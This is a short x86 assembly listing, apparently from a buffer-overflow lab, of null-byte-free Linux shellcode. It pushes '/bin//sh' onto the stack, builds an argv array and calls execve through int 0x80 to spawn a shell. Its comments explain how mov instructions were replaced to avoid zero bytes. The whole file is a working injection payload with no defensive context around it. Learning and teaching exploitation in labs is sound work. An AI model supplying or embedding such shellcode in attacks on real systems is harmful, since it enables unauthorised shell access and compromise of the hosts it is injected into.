section .text
  global _start
    _start:
      ; Store the argument string on stack
      xor eax, eax      ; replace mov eax, 0

      push eax          ; Use 0 to terminate the string
      push "//sh"
      push "/bin"
      mov  ebx, esp     ; Get the string address

      ; Construct the argument array argv[]
      push eax          ; argv[1] = 0
      push ebx          ; argv[0] points "/bin//sh"
      mov  ecx, esp     ; Get the address of argv[]

      ; For environment variable 
      cdq               ; replace mov edx, 0

      ; Call execve()
      mov  al, 0x0b     ; delete mov eax, 0
      
      int  0x80